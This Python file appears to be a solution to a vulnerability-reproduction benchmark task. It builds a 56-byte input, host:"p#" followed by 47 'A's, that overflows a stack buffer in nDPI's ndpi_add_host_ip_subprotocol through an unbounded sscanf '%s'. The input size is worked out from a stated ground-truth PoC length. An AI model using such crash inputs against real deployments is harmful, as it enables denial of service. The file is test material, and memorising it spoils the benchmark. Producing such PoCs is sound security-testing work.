import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a stack buffer overflow in `ndpi_add_host_ip_subprotocol`
        # triggered by parsing a custom rule with `sscanf`. The vulnerable format string
        # is `"%*[^#]#%s"`, which reads into a stack buffer `tail`.
        #
        # From the ground-truth PoC length of 56 bytes, we can reverse-engineer the
        # required components and the buffer size.
        #
        # PoC structure: `host:"<prefix>#<overflow_payload>"`
        # Length breakdown:
        # - `host:"`: 6 bytes
        # - `<prefix>`: at least 1 byte (required by `sscanf`'s `%[^#]` specifier). Let's use "p".
        # - `#`: 1 byte
        # - `<overflow_payload>`: variable length
        # - `"`: 1 byte
        #
        # Total length = 6 + 1 (prefix) + 1 (separator) + len(payload) + 1 = 56
        # 9 + len(payload) = 56
        # len(payload) = 47
        #
        # A payload of 47 characters read by `%s` will cause `sscanf` to write 48 bytes
        # (47 chars + null terminator). This implies the `tail` buffer is 47 bytes long,
        # leading to a one-byte overflow, which is sufficient to trigger a crash with ASan.

        prefix = "p"
        overflow_payload = "A" * 47
        
        poc_string = f'host:"{prefix}#{overflow_payload}"'
        
        return poc_string.encode('ascii')